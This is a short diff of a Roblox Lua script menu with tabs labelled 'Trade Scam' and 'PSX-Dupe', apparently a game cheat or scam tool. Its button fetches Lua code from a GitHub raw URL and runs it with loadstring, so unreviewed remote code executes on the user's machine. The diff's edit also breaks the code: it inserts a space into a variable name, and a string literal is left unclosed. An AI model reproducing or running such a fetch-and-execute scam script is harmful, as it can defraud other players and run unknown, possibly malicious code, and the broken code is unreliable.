@@ -9,6 +9,6 @@ local MainSection = Main:NewSection("Trade Scam")
 local Dupe = Window:NewTab("Dupe")
 local DupeSection = Dupe:NewSection("PSX-Dupe")
 
-MainSection:NewButton("Click To Activate!", "Script BY 8888 Team!, function()
+Main Section:NewButton("Click To Activate!", "Script BY 8888 Team!, function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Maset0/dsdsdsd/main/info.lua"))()
 end)
